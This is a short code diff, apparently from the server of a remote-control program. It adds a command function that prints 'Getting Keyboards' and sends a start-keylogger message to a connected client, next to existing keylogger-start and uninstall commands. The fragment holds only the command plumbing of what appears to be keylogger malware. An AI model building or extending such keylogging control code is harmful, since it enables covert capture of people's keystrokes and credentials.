@@ -20,6 +20,12 @@ void cmd_uninstall(struct server_options * server_options) {
 }
 
 //NOLINTNEXTLINE
+void cmd_get_keyboards(struct server_options * server_options) {
+    printf("Getting Keyboards\n");
+    send_start_keylogger(server_options->client_fd);
+}
+
+//NOLINTNEXTLINE
 void cmd_start_keylogger(struct server_options * server_options) {
     printf("Starting Keylogger\n");
 
